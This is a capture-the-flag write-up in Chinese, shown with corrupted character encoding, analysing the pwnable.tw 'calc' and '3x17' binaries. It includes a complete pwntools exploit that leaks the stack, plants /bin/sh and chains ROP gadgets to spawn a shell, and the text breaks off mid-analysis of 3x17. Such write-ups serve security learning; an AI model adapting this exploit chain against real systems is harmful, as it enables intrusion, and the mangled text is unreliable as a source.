ˆï¼š\næˆ‘ä»¬é€ä¸ªåˆ†æè¿™ä¸ªä¼ªä»£ç çš„åŠŸèƒ½ï¼š\n v4 = __readgsdword(0x14u) è¿™ä¸ªä» MSDN ä¸­å¯ä»¥æ‰¾åˆ°å‡½æ•°çš„åŠŸèƒ½ï¼Œå®ƒä»ä¸ gs æ®µèµ·å§‹ä½ç½®ç›¸å¯¹ 0x14u çš„ä½ç½®ä¸­å–å‡ºä¸€ä¸ªæ•°å­—å¹¶èµ‹å€¼ç»™ v4ã€‚å®ƒåº”è¯¥æ˜¯å®ç°äº†ä¸€ä¸ª Canary çš„åŠŸèƒ½ã€‚ å¾ªç¯ä¸­ç¬¬ä¸€ä¸ªè¯­å¥ bzero(%ebp - 0x40c, 0x400) ä»”ç»†æŸ¥çœ‹äº†å…¶ä¸­çš„å‡½æ•°è°ƒç”¨ï¼Œä¹‹ååˆä»¥æ— å‚æ•°å½¢å¼è°ƒç”¨äº† bzero() çš„ä¸€ä¸ªé‡è½½ï¼Œä¸å¤ªçœ‹å¾—æ‡‚ã€‚æˆ‘ä»¬çŒœæµ‹æ˜¯åˆå§‹åŒ–çš„ï¼› get_expr(%ebp - 0x40c, 1024) åº”è¯¥æ˜¯ä»æˆ‘ä»¬çš„æ ‡å‡†è¾“å…¥è¯»å–è¡¨è¾¾å¼çš„å‡½æ•°ï¼Œæˆ‘ä»¬æš‚æ—¶ä¸ç ”ç©¶å…¶é€»è¾‘ï¼› init_pool(%ebp - 0x5a0); è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯ï¼Œå°†ä¼ å…¥çš„æŒ‡é’ˆä½œä¸ºä¸€ä¸ªå››å­—èŠ‚çš„æŒ‡é’ˆï¼Œå¹¶ä¸”å°†è¿™ä¸ªåœ°å€ä¹‹åçš„çš„ 100 ä¸ªä½ç½®å…¨éƒ¨èµ‹å€¼ä¸º 0ã€‚æ˜¯ä¸€ä¸ªåˆå§‹åŒ– int æ•°ç»„çš„å‡½æ•°ã€‚ parse_expr(%ebp -0x40c, %ebp - 0x5a0) åº”è¯¥æ˜¯å°†è¾“å…¥è§£æåˆ° %ebp - 0x5a0 è¿™ä¸ªåœ°æ–¹åšå­˜å‚¨ç»“æœçš„å‡½æ•°ï¼Œæˆ‘ä»¬æš‚æ—¶ä¸ç ”ç©¶å…¶é€»è¾‘ï¼› å¦‚æœè§£ææˆåŠŸä¼šè°ƒç”¨ printf((const char *)\u0026amp;unk_80BF804, v2[v1 - 1]);ï¼Œå…¶ä¸­ unk_80BF804 çš„å†…å®¹å°±æ˜¯ %dï¼Œv2[v1 - 1] åº”è¯¥æ˜¯ç»“æœå­˜å‚¨çš„ä½ç½®ï¼ˆç”±å®ƒä»¬çš„ç›¸å¯¹ä½ç½®æˆ‘ä»¬å¯ä»¥åˆ†æçŸ¥é“ï¼Œv2 æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œv1 åº”è¯¥æ˜¯ä¸€ä¸ªæ ‡è®°ç»“æœä¸ v2 èµ·å§‹ä½ç½®ç›¸å¯¹ä½ç½®çš„æ•´æ•°ï¼‰ã€‚  é€»è¾‘æ¸…æ™°äº†ï¼Œæˆ‘ä»¬æ¥ç€åˆ†æå–è¡¨è¾¾å¼å’Œè§£æè¡¨è¾¾å¼è¿™ä¸¤ä¸ªå…³é”®çš„å‡½æ•°ã€‚\nget_expr #  é¦–å…ˆæ˜¯ get_expr è¯»å–è¡¨è¾¾å¼çš„å‡½æ•°ï¼Œæˆ‘é‡å‘½åäº†å…¶ä¸­çš„å˜é‡ï¼Œé€»è¾‘éå¸¸åœ°æ¸…æ™°ï¼š\nint __cdecl get_expr(int dest, int max_len) {  int chr_pos; // eax  char input_chr; // [esp+1Bh] [ebp-Dh]  int cur_len; // [esp+1Ch] [ebp-Ch]   cur_len = 0;  while ( cur_len \u0026lt; max_len \u0026amp;\u0026amp; read(0, \u0026amp;input_chr, 1) != -1 \u0026amp;\u0026amp; input_chr != \u0026#39;\\n\u0026#39; )  {  if ( input_chr == \u0026#39;+\u0026#39;  || input_chr == \u0026#39;-\u0026#39;  || input_chr == \u0026#39;*\u0026#39;  || input_chr == \u0026#39;/\u0026#39;  || input_chr == \u0026#39;%\u0026#39;  || input_chr \u0026gt; 47 \u0026amp;\u0026amp; input_chr \u0026lt;= 57 )  {  chr_pos = cur_len++;  *(_BYTE *)(dest + chr_pos) = input_chr;  }  }  *(_BYTE *)(cur_len + dest) = 0;  return cur_len; } eval #  åœ¨è®¨è®ºå‡½æ•° parse_expr ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆåˆ†æåœ¨å®ƒè°ƒç”¨æœ€é¢‘ç¹çš„å‡½æ•° evalï¼š\nint *__cdecl eval(int *num_stack, char operator) {  int *result; // eax   if (operator== \u0026#39;+\u0026#39;)  {  num_stack[*num_stack - 1] += num_stack[*num_stack];  }  else if (operator\u0026gt; 43)  {  if (operator== \u0026#39;-\u0026#39;)  {  num_stack[*num_stack - 1] -= num_stack[*num_stack];  }  else if (operator== \u0026#39;/\u0026#39;)  {  num_stack[*num_stack - 1] /= num_stack[*num_stack];  }  }  else if (operator== \u0026#39;*\u0026#39;)  {  num_stack[*num_stack - 1] *= num_stack[*num_stack];  }  result = num_stack;  --*num_stack;  return result; } ç®€å•åœ°è¯´è¿™ä¸ªå‡½æ•°åšäº†è¿™æ ·ä¸€ä»¶äº‹æƒ…ï¼š\n å®ƒä¼ å…¥ä¸€ä¸ªæ•°å­—æ ˆå’Œä¸€ä¸ªå­—ç¬¦å‹çš„æ“ä½œç¬¦ å®ƒå¼¹å‡ºäº†æ ˆé¡¶çš„ä¸¤ä¸ªå…ƒç´ ï¼Œå¯¹æ ˆé¡¶çš„è¿™ä¸¤ä¸ªå…ƒç´ è¿›è¡Œè¿™ä¸ªæ“ä½œç¬¦æ‰€æŒ‡å®šçš„è¿ç®— å°†è¿™ä¸ªè¿ç®—ç»“æœå‹æ ˆ  parse_expr #  ç„¶åæˆ‘ä»¬åˆ†æ parse_exprï¼Œæ¼æ´åº”è¯¥å°±å‡ºç°åœ¨è¿™é‡Œã€‚æˆ‘é€šè¯»äº†ä¼ªä»£ç ä¹‹åé‡å‘½åäº†ä¸€äº›å±€éƒ¨å˜é‡ï¼Œå¹¶ä¸”å¯¹ç…§æ±‡ç¼–ä»£ç è§£å†³äº†ä¸€äº›ä¸å¿…è¦çš„è½¬æ¢ä¹‹åå¾—åˆ°ä»¥ä¸‹çš„ä¼ªä»£ç ï¼š\nsigned int __cdecl parse_expr(int src_str, _DWORD *dest) {  int dest_len; // [esp+18h] [ebp-90h]  char *src_str_cpy; // [esp+1Ch] [ecp-8Ch]  int numstr_bgn; // [esp+20h] [ebp-88h]  int i; // [esp+24h] [ebp-84h]  int stack_top; // [esp+28h] [ebp-80h]  int numstr_len; // [esp+2Ch] [ebp-7Ch]  char *numstr; // [esp+30h] [ebp-78h]  int number; // [esp+34h] [ebp-74h]  char stack[100]; // [esp+38h] [ebp-70h]  unsigned int canary; // [esp+9Ch] [ebp-Ch]   canary = __readgsdword(0x14u);  numstr_bgn = src_str;  stack_top = 0;  bzero(stack, 0x64u);  for (i = 0;; ++i)  {  // if operator  if ((unsigned int)(*(char *)(i + src_str) - 48) \u0026gt; 9)  {  numstr_len = i + src_str - numstr_bgn;  numstr = (char *)malloc(numstr_len + 1);  memcpy(numstr, numstr_bgn, numstr_len);  numstr[numstr_len] = 0;  if (!strcmp(numstr, \u0026#34;0\u0026#34;))  {  puts(\u0026#34;prevent division by zero\u0026#34;);  fflush(stdout);  return 0;  }  number = atoi(numstr);  if (number \u0026gt; 0)  {  dest_len = (*dest)++;  dest[dest_len + 1] = number;  }  if (*(_BYTE *)(i + src_str) \u0026amp;\u0026amp; (unsigned int)(*(char *)(i + 1 + src_str) - 48) \u0026gt; 9)  {  puts(\u0026#34;expression error!\u0026#34;);  fflush(stdout);  return 0;  }  numstr_bgn = i + 1 + src_str;  if (stack[stack_top])  {  switch (*(char *)(i + src_str))  {  case \u0026#39;%\u0026#39;:  case \u0026#39;*\u0026#39;:  case \u0026#39;/\u0026#39;:  // */%: æ ˆé¡¶æ˜¯åŠ å‡æ³•åˆ™å°†æ“ä½œç¬¦å…¥æ ˆï¼Œå¦åˆ™è°ƒç”¨ eval åè¦†ç›–æ ˆé¡¶  if (stack[stack_top] != \u0026#39;+\u0026#39; \u0026amp;\u0026amp; stack[stack_top] != \u0026#39;-\u0026#39;)  {  eval(dest, stack[stack_top]);  stack[stack_top] = *(_BYTE *)(i + src_str);  }  else  {  stack[++stack_top] = *(_BYTE *)(i + src_str);  }  break;  case \u0026#39;+\u0026#39;:  case \u0026#39;-\u0026#39;:  // +-: è°ƒç”¨ eval åè¦†ç›–æ ˆé¡¶  eval(dest, stack[stack_top]);  stack[stack_top] = *(_BYTE *)(i + src_str);  break;  default:  eval(dest, stack[stack_top--]);  break;  }  }  else  {  stack[stack_top] = *(_BYTE *)(i + src_str);  }  if (!*(_BYTE *)(i + src_str))  break;  }  }  while (stack_top \u0026gt;= 0)  eval(dest, stack[stack_top--]);  return 1; } è¿™ä¸ªè§£æè¿ç®—ç¬¦çš„æµç¨‹å¤§è‡´å¯ä»¥ä» æ•°å­—æ ˆ num_stack ä¸ æ“ä½œç¬¦æ ˆ op_stack è¿™ä¸¤ä¸ªæ ˆä¹‹é—´çš„è¿ç®—å±•å¼€ã€‚æˆ‘è§‰å¾—æœ‰å¿…è¦ç”¨ä¸€ä¸ªçŠ¶æ€è½¬æ¢å›¾æ¥è§£é‡Šè¿™ä¸ªå‡½æ•°çš„å·¥ä½œæµç¨‹ï¼Œæˆ‘ä»¬ç”¨æ“ä½œç¬¦æ ˆçš„æ ˆé¡¶æ¥ç¡®å®šä¸‰ç§çŠ¶æ€ï¼š\n ä¸Šå›¾ä¸­ï¼šæ–¹å½¢è¡¨ç¤ºçŠ¶æ€ï¼ŒçŸ©å½¢è¡¨ç¤ºæ‰§è¡Œçš„æ“ä½œï¼Œç®­å¤´ä¸Šçš„å­—ç¬¦è¡¨ç¤ºçŠ¶æ€è½¬ç§»æ¡ä»¶ï¼› ä¸Šå›¾ä¸­ï¼šState1 è¡¨ç¤ºæ“ä½œç¬¦æ ˆé¡¶ä¸ºç©ºï¼ŒState2 è¡¨ç¤ºæ“ä½œç¬¦æ ˆé¡¶ä¸æ˜¯ +- å·ï¼ŒState3 è¡¨ç¤ºæ“ä½œç¬¦æ ˆé¡¶æ˜¯åŠ å‡å·ã€‚å¾ˆæ˜¾ç„¶ï¼Œåˆå§‹çŠ¶æ€æ˜¯ State1ï¼› ç¨‹åºçš„é€»è¾‘ä¿è¯äº†ï¼šä»»ä½•ä¸€ä¸ªæ“ä½œç¬¦åä¸€ä¸ªå­—ç¬¦ä¸ä¼šæ˜¯æ“ä½œç¬¦ï¼Œé™¤å·çš„ç¬¬äºŒä¸ªæ“ä½œç¬¦ä¸èƒ½æ˜¯ \u0026quot;0\u0026quot;  æ¼æ´ #  å‘ç° #  ç»è¿‡ä¸Šé¢çš„åˆ†æï¼Œparse_expr è¿™ä¸ªå‡½æ•°æˆ‘ä¸»è¦å‘ç°äº†ä¸¤ä¸ªæ¼æ´ï¼š\n ç¨‹åºåœ¨æ’é™¤è¢«é™¤æ•°ä¸ä¸º 0 çš„æ¡ä»¶æ—¶ï¼Œç”¨çš„åˆ¤æ–­æ˜¯è¢«é™¤æ•°å­—ç¬¦ä¸²ä¸ç­‰äº \u0026quot;0\u0026quot;ï¼›å¯¹äºè¿™ä¸ªæ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¾“å…¥ \u0026quot;00\u0026quot; ç­‰æ–¹å¼è®©ç¨‹åºäº§ç”Ÿé™¤é›¶æ“ä½œã€‚ä½†æ˜¯å¹¶ä¸çŸ¥é“è¿™ä¸ªæ¼æ´å¦‚ä½•åˆ©ç”¨ï¼› ç¨‹åºåœ¨æ‰§è¡Œ eval æ—¶ï¼Œå¿…é¡»è¦æ»¡è¶³æ•°å­—æ ˆä¸­å­˜åœ¨å¤§äºä¸¤ä¸ªçš„æ•°å­—ï¼Œä½†æ˜¯ä»¥ä¸‹åŸå› ä¼šå¯¼è‡´è¿™ä¸ªæ¡ä»¶å¹¶ä¸æˆç«‹ï¼š  è¾“å…¥å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºæ“ä½œç¬¦ï¼› æŸæ¬¡çš„è¾“å…¥æ•°å­—ä¸º 0ï¼Œè¿™ä¸ªæ•°å­—åˆ™ä¸ä¼šè¢«ç¨‹åºå‹æ ˆï¼›    ä¸‹é¢æˆ‘ä»¬å°è¯•åˆ©ç”¨ç¬¬äºŒæ¡çš„ç¬¬ä¸€ä¸ªæ¼æ´ï¼Œå°±å¯ä»¥æ”¹å˜æ•°å­—æ ˆçš„é«˜åº¦ï¼Œä»è€Œè¾¾åˆ°ä¿®æ”¹ä»»æ„åœ°å€çš„ç›®çš„ã€‚\nåˆ©ç”¨ #  æˆ‘ä»¬åˆ©ç”¨çš„åŸºæœ¬æ€è·¯æ˜¯ï¼šå…ˆæ³„éœ²æ ˆåœ°å€ï¼Œç„¶åæ³¨å…¥å­—ç¬¦ä¸² /bin/shï¼Œæœ€åæ„é€ ä¸€ä¸ªè¿™æ ·çš„æ ˆï¼š\nstack-top\t|ad1\t|0xb\t|ad2\t|0x0\t|adstr\t|ad3\t|0x0\t|ad4 å…¶ä¸­ ad1ã€ad2ã€ad3ã€ad4 æ˜¯ä¸‰ä¸ªé€šè¿‡ ROP æŠ€æœ¯çš„åˆ°çš„ä¸‰ä¸ªåœ°å€ï¼Œå®ƒä»¬åˆ†åˆ«æ‰§è¡Œï¼š\nad1:\tpop %eax; ret;\rad2:\tpop %ecx; pop %ebx; ret;\rad3:\tpop %edx; ret;\rad4:\tint 80h; è€Œå…¶ä¸­çš„ adstr åˆ™æ˜¯ä¹‹å‰æ³¨å…¥çš„ /bin/sh çš„åœ°å€ã€‚æ„é€ äº†å¦‚ä¸‹çš„ expï¼š\n#!/usr/bin/env python #coding=utf-8 from pwn import *  class Challenge:  def __init__(self, local=True):  self.local = local  if local:  self.p = process([\u0026#39;./calc\u0026#39;])  else:  self.p = remote(\u0026#34;chall.pwnable.tw\u0026#34;, 10100)   def gdb(self):  assert self.local  context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;]  gdb.attach(proc.pidof(self.p)[0], gdbscript=\u0026#34;b *get_expr\u0026#34;)   def leak_ebp(self):  \u0026#34;\u0026#34;\u0026#34; payload: *361 \u0026#34;\u0026#34;\u0026#34;  offset = 0x5a0 / 4 + 1  self.payload = \u0026#34;*%d\\n\u0026#34; % (offset)  self.p.send(self.payload)   self.main_ebp = int(self.p.recvline(), 10) \u0026amp; 0xffffffff  self.calc_ebp = self.main_ebp - 0x20  self.parse_expr_ebp = self.calc_ebp - 0x5c0  print(\u0026#34;main $ebp:\u0026#34; + hex(self.main_ebp))  print(\u0026#34;calc $ebp:\u0026#34; + hex(self.calc_ebp))  print(\u0026#34;parse_ebp $ebp:\u0026#34; + hex(self.parse_expr_ebp))   def write_binsh(self):  \u0026#34;\u0026#34;\u0026#34; payload: *701+1845554944+6845231 \u0026#34;\u0026#34;\u0026#34;  binsh = [u32(\u0026#34;/bin\u0026#34;), u32(\u0026#34;/sh\\0\u0026#34;)] # 0x6e69622f, 0x0068732f  sent_number = [binsh[0]-binsh[1], binsh[1]]  self.payload = \u0026#34;*701+%d+%d\\n\u0026#34; % (sent_number[0], sent_number[1])  self.p.send(self.payload)  assert p32(int(self.p.recvline(), 10)) == \u0026#34;/bin\u0026#34;   self.binsh_addr = self.calc_ebp - 0x5a0 + 700 * 4  print(\u0026#34;write \u0026#39;/bin/sh\u0026#39;: %s\u0026#34; % hex(self.binsh_addr) )   def ROP(self):  addr1 = 0x0805c34b # pop eax; ret  addr2 = 0x080701d1 # pop ecx; pop ebx; ret  addr3 = 0x080701aa # pop edx; ret  addr4 = 0x08049a21 # int 0x80  stack = [addr1, 0xb, addr2, 0x0, -0x100000000 + self.binsh_addr, addr3, 0x0, addr4]  n = [ stack[i+1] + stack[i] for i in range(7)] + [ stack[7] ]  assert n[3] \u0026lt; 0  self.payload = \u0026#34;*361-1*%d-1*%d-1*%d-1*%d+%d+%d\u0026#34; % \\  (n[0], n[1], n[2], -n[3], 0x80000000+n[3], 0x80000000+n[3])  if n[4] \u0026gt; 0:  self.payload += \u0026#34;-1*%d\u0026#34; % n[4]  else:  self.payload += \u0026#34;-1*%d+%d+%d\u0026#34; % (-n[4], 0x80000000 + n[4], 0x80000000 + n[4] )  self.payload += \u0026#34;-1*%d-1*%d-1*%d\\n\u0026#34; % (n[5], n[6], n[7])  self.p.send(self.payload)  self.p.recvline()   def get_shell(self):  self.p.send(\u0026#34;illegal\u0026#34;)  self.p.interactive()   def pwn(self):  print(\u0026#34;----------begin-----------\u0026#34;)  self.p.recvline()  self.leak_ebp()  self.write_binsh()  self.ROP()  self.get_shell()  self.p.wait_for_close()  print(\u0026#34;-----------end------------\u0026#34;)   if __name__ == \u0026#34;__main__\u0026#34;:  s = Challenge(True)  s.pwn() å†™ exp æœ€å debug çš„æ—¶å€™æœ‰ä»¥ä¸‹çš„å‡ ä¸ªå‘ç‚¹ï¼š\n æˆ‘ä»¬åˆ©ç”¨ä¹˜æ³•ä¼˜å…ˆçº§æ¯”è¾ƒé«˜çš„ç‰¹æ€§ï¼Œå¯ä»¥æ„é€  1*addr è¿™æ ·çš„è¡¨è¾¾å¼å°†ä¸Šé¢çš„åœ°å€å…¨éƒ¨æŒ‰é¡ºåºå‹å…¥æ ˆä¸­ã€‚ä½†æ˜¯é—®é¢˜æ˜¯ adstr æ˜¯ä¸€ä¸ªè´Ÿæ•°ï¼Œç”¨è¿™ç§æ–¹å¼å‹æ ˆä¼šå‡ºç°è¡¨è¾¾å¼é”™è¯¯ï¼ˆ*- ä¸¤ä¸ªè¿ç®—ç¬¦åŒæ—¶å‡ºç°ï¼‰ã€‚ /bin/sh è¿™ä¸ªå­—ç¬¦ä¸²ä¸èƒ½å†™åœ¨ calc è¿™ä¸ªå‡½æ•°çš„å±€éƒ¨å˜é‡åŒºï¼Œå› ä¸ºæ¯æ¬¡å¾ªç¯æ—¶ä¼šè¢«åˆå§‹åŒ–ã€‚  "},{"id":165,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/pwnable/4.3x17/","title":"4.3x17","section":"pwnable","content":" å‚è€ƒèµ„æ–™ï¼š\n https://github.com/maroueneboubakri/lscan/wiki/Reverse-Engineer-a-stripped-binary-with-lscan-and-IDApro https://www.jianshu.com/p/7a1441e4f355   3x17 #  ä¿æŠ¤ç­‰çº§ #  é¦–å…ˆæ£€æŸ¥ç¨‹åºçš„ä¿æŠ¤ç­‰çº§ï¼š\n$ checksec 3x17 [*] \u0026#39;/media/data/program/ctf/pwnable/3x17/3x17\u0026#39;  Arch: amd64-64-little  RELRO: Partial RELRO  Stack: No canary found  NX: NX enabled  PIE: No PIE (0x400000) é¦–å…ˆæˆ‘ä»¬å‘ç°è¿™æ˜¯ä¸€ä¸ª 64 ä½çš„ç¨‹åºï¼Œå¦å¤–ç¨‹åºæ²¡æœ‰å¼€å¯æ ˆæº¢å‡ºçš„ canary ä¿æŠ¤ï¼Œä½†æ˜¯å †æ ˆä¸å¯æ‰§è¡Œã€‚\næˆ‘ä»¬å†çœ‹ç¨‹åºçš„é“¾æ¥æ–¹å¼ï¼š\n$ objdump -R 3x17  3x17ï¼š æ–‡ä»¶æ ¼å¼ elf64-x86-64  objdump: 3x17ï¼šä¸æ˜¯åŠ¨æ€å¯¹è±¡ objdump: 3x17: invalid operation æ˜¯ä¸€ä¸ªé™æ€é“¾æ¥çš„æ–‡ä»¶ã€‚çœ‹å„ä¸ªæ®µçš„æƒé™ï¼š\ngdb-peda$ vmmap Start End Perm\tName 0x00401000 0x0048e335 rx-p\t/root/ctf/pwnable/3x17/3x17 0x00400200 0x004b2a31 r--p\t/root/ctf/pwnable/3x17/3x17 0x004b40c0 0x004baa20 rw-p\t/root/ctf/pwnable/3x17/3x17 åŠ è½½ sig å‡½æ•°ç­¾å #  lscan.py #  åœ¨ gdb ä¸­æˆ‘ä»¬å¹¶æ²¡æœ‰å‘ç°ä»»ä½•å‡½æ•°åä¸å˜é‡åçš„ä¿¡æ¯ã€‚äºæ˜¯æˆ‘ä»¬å¯ä»¥å°è¯•ä¸ºæ–‡ä»¶æ·»åŠ ä¸€äº›æ ‡è¯†ï¼Œå¦åˆ™åˆ†æèµ·æ¥å°±å¤ªå›°éš¾äº†ã€‚\næˆ‘åœ¨ç½‘ä¸Šæ‰¾äº†ä¸€åœˆï¼Œå‘ç°å¤§å®¶éƒ½ç”¨ä¸€ä¸ª lscan.py çš„é¡¹ç›®ï¼Œè¿™æ˜¯ä¸€ä¸ªå¯å‘å¼çš„æ£€æµ‹é¡¹ç›®ï¼Œè¿™ä¸ªé¡¹ç›®é€šè¿‡è¯†åˆ«æ–‡ä»¶çš„ç­¾åï¼Œä¸ºé™æ€é“¾æ¥çš„æ–‡ä»¶æŸ¥æ‰¾æœ€å¯èƒ½ç”¨äºé“¾æ¥çš„ç­¾åæ–‡ä»¶ï¼š\n$ mkvirtualenv -p python2.7 Reverse2.7  $ pip install pyelftools pefile  $ git clone https://github.com/maroueneboubakri/lscan.git \u0026amp;\u0026amp; cd lscan  $ python lscan.py -f D:/program/ctf/pwnable/3x17/3x17 -S ./amd64/sig D:\\program\\git\\lscan\\amd64\\sig\\libc-2.13.sig 12266/3369 (364.08%) D:\\program\\git\\lscan\\amd64\\sig\\libc-2.22.sig 12870/2859 (450.16%) D:\\program\\git\\lscan\\amd64\\sig\\libc-2.23.sig 13163/2869 (458.80%) D:\\program\\git\\lscan\\amd64\\sig\\libcrypto-1.0.2h.sig 36850/5057 (728.69%) D:\\program\\git\\lscan\\amd64\\sig\\libm-2.13.sig 11125/445 (2500.00%) D:\\program\\git\\lscan\\amd64\\sig\\libm-2.22.sig 11121/582 (1910.82%) D:\\program\\git\\lscan\\amd64\\sig\\libm-2.23.sig 11124/600 (1854.00%) D:\\program\\git\\lscan\\amd64\\sig\\libpcre-8.38.sig 18/150 (12.00%) D:\\program\\git\\lscan\\amd64\\sig\\libpthread-2.13.sig 11379/319 (3567.08%) D:\\program\\git\\lscan\\amd64\\sig\\libpthread-2.22.sig 11159/262 (4259.16%) D:\\program\\git\\lscan\\amd64\\sig\\libpthread-2.23.sig 11160/258 (4325.58%) D:\\program\\git\\lscan\\amd64\\sig\\libssl-1.0.2h.sig 0/665 (0.00%) æˆ‘ä»¬å‘ç°å®ƒä»¬çš„è¯†åˆ«ç‡éƒ½è¶…è¿‡çš„ 100%ï¼Œè€Œé¡¹ç›®å®˜ç½‘ä¸Šæä¾›çš„ demo ä¸­æ˜¯å¾ˆæ­£ç¡®çš„ï¼Œé‚£ä¸€å®šæ˜¯å“ªé‡Œå‡ºäº†é—®é¢˜ï¼Œäºæ˜¯æˆ‘å¼€å§‹é˜…è¯»è¿™ä¸ªå·¥å…·çš„æºç ä»¥ä¿®æ­£è¿™ä¸€ bugã€‚\né¡¹ç›®ä¿®å¤ #  æˆ‘ä»¬é¦–å…ˆä½¿ç”¨ pycallgraph è¿™ä¸ªå·¥å…·å¾—åˆ°äº†ä¸€ä¸ªå‡½æ•°çš„è°ƒç”¨å›¾ï¼š\nå¯è§ lscan çš„å¤§è‡´æµç¨‹å¤§æ¦‚åˆ†ä¸ºä¸‰æ­¥ï¼šè§£æ elf å¯æ‰§è¡Œæ–‡ä»¶ã€è§£æ sig ç­¾åæ–‡ä»¶ã€åŒ¹é… sig ä¸ elfã€‚æ ¹æ®ä¸Šé¢å‡ºç°çš„é—®é¢˜ï¼Œåº”è¯¥æ˜¯ç¬¬ä¸‰æ­¥è§£æé”™è¯¯ã€‚\nEDITï¼šä¿®äº†ä¸€åŠï¼Œbug å®åœ¨å¤ªå¤šäº†ï¼ï¼ï¼æ”¾å¼ƒè¿™ä¸ªå·¥å…·ã€‚æˆ‘è¦å–æ¶ˆ github ä¸Šçš„èµã€‚\nIDA æ’ä»¶ #  åœ¨ Google ä¸Šæ‰¾äº†å¾ˆä¹…æƒ³è¦å¯ä»¥æ»¡è¶³è¿™ä¸ªéœ€æ±‚çš„æ’ä»¶ï¼š\n github ä¸Šæœ‰ä¸€ä¸ªå„ç§æ’ä»¶çš„åˆ—è¡¨ï¼šhttps://github.com/onethawt/idaplugins-listã€‚ä½†æ˜¯è¿™é‡Œé¢ä¼¼ä¹æ²¡æœ‰ã€‚  ç¨‹åºæµç¨‹ #  start #  åœ¨ç¨‹åºå…¥å£å‡½æ•° start è°ƒç”¨çš„å‡ ä¸ªå‡½æ•°ä¸­ï¼Œå¯ä»¥æ ¹æ®å‚æ•°åˆ¤æ–­çœ‹åˆ° main å‡½æ•°ã€‚\nmain #  main å‡½æ•°ä¸­ï¼Œç”± Ida Pro çš„åˆ°çš„ c ä»£ç å¯¹æŸäº›å‡½æ•°çš„å‚æ•°å¤„ç†ä¼¼ä¹æœ‰ä¸€äº›é—®é¢˜ï¼š\n// local variable allocation has failed, the output may be wrong!\rint __cdecl main(int argc, const char **argv, const char **envp)\r{\rint result; // eax\rint v4; // eax\rchar *v5; // ST08_8\r__int64 v6; // rcx\runsigned __int64 v7; // rt1\rchar buf[24]; // [rsp+10h] [rbp-20h]\runsigned __int64 v9; // [rsp+28h] [rbp-8h]\rv9 = __readfsqword(0x28u);\rresult = (unsigned __int8)++ITER;\rif ( ITER == 1 )\r{\rwrite(1u, \u0026#34;addr:\u0026#34;, 5uLL);\rread(0, buf, 0x18uLL);\rstrcpy((__int64)buf);\rv5 = (char *)v4;\rwrite(1u, \u0026#34;data:\u0026#34;, 5uLL);\rargv = (const char **)v5;\r*(_QWORD *)\u0026amp;argc = 0LL;\rread(0, v5, 0x18uLL);\rresult = 0;\r}\rv7 = __readfsqword(0x28u);\rv6 = v7 ^ v9;\rif ( v7 != v9 )\rsub_44A3E0(*(_QWORD *)\u0026amp;argc, argv, envp, v6);\rreturn result;\r} main å‡½æ•°çš„é€»è¾‘å¤§è‡´æ˜¯ï¼š\n å…ˆæ£€æµ‹å…¨å±€å˜é‡ä¸­ ITER çš„å€¼ï¼Œå¦‚æœé€šè¿‡æ£€æµ‹ï¼Œåˆ™æ‰§è¡Œä¸‹é¢çš„ä¸¤æ­¥ï¼š  è¯»å– 0x18 ä¸ªå­—èŠ‚ addr åˆ°ç¼“å†²åŒºå†…ï¼Œç„¶åè¿›è¡Œä¸€æ¬¡å­—ç¬¦ä¸²å¤åˆ¶ï¼ˆstrcpy å‡½æ•°æ˜¯çŒœçš„ï¼‰ï¼› å†è¯»å– 0x18 ä¸ªå­—èŠ‚ data åˆ°ç¼“å†²åŒºå†…ï¼Œç„¶åå†è¿›è¡Œä¸€æ¬¡å­—ç¬¦ä¸²èµ‹å€¼ï¼›   æ£€æµ‹æ ˆæº¢å‡ºï¼Œå¦‚æœæ ˆæº¢å‡ºå‘ç”Ÿåˆ™è°ƒç”¨ sub_44A3E0 å‡½æ•°ã€‚  æˆ‘å†ä»”ç»†çœ‹çœ‹æ¡ä»¶åˆ†æ”¯å†…çš„æ±‡ç¼–ä»£ç ï¼ˆç„¶åæˆ‘ä»¬é‡æ–°è‡ªå·±å‘½åäº†å‡½æ•°ï¼‰ï¼š\n; 15: write(1u, \u0026#34;addr:\u0026#34;, 5uLL);\rmov [rbp+var_28], 0\rmov edx, 5 ; count\rlea rsi, buf ; \u0026#34;addr:\u0026#34;\rmov edi, 1 ; fd\rmov eax, 0\rcall write\r; 16: read(0, buf, 0x18uLL);\rlea rax, [rbp+buf]\rmov edx, 18h ; count\rmov rsi, rax ; buf\rmov edi, 0 ; fd\rmov eax, 0\rcall read\r; 17: addr = atoi((__int64)buf);\rlea rax, [rbp+buf]\rmov rdi, rax\rmov eax, 0\rcall atoi\rcdqe\rmov [rbp+addr], rax\r; 18: write(1u, \u0026#34;data:\u0026#34;, 5uLL);\rmov edx, 5 ; count\rlea rsi, aData ; \u0026#34;data:\u0026#34;\rmov edi, 1 ; fd\rmov eax, 0\rcall write\r; 19: read(0, addr \u0026amp; 0xffffffff, 0x18);\rmov rax, [rbp+addr]\rmov edx, 18h ; count\rmov rsi, rax ; buf\rmov edi, 0 ; fd\rmov eax, 0\rcall read\rmov eax, 0\rjmp short loc_401C37 ä¹Ÿå°±æ˜¯è¯´ï¼Œé«˜çº§è¯­è¨€ä»£ç åº”è¯¥æ˜¯è¿™æ ·çš„ï¼š\nint __cdecl main(int argc, const char **argv, const char **envp) {  int result; // eax  int addr; // ST08_8  __int64 v6; // rcx  unsigned __int64 v7; // rt1  char buf[24]; // [rsp+10h] [rbp-20h]  unsigned __int64 v9; // [rsp+28h] [rbp-8h]   v9 = __readfsqword(0x28u);  result = (unsigned __int8)++ITER;  if ( ITER == 1 )  { \twrite(1u, \u0026#34;addr:\u0026#34;, 5uLL); \tread(0, buf, 0x18uLL); \taddr = atoi((__int64)buf); \twrite(1u, \u0026#34;data:\u0026#34;, 5uLL); \tread(0, addr \u0026amp; 0xffffffff, 0x18);  result = 0;  }  if ( v9 != __readfsqword(0x28u))  __stack_chk_fail(*(_QWORD *)\u0026amp;argc, argv, envp);  return result; } å¯è§å®ƒä¸»è¦æä¾›äº†ä¸€ä¸ªä»»æ„åœ°å€å†™çš„åŠŸèƒ½ï¼Œä½†æ˜¯ç”±äºæˆ‘ä»¬åªèƒ½æ§åˆ¶ä½ 32 ä½ï¼Œå› 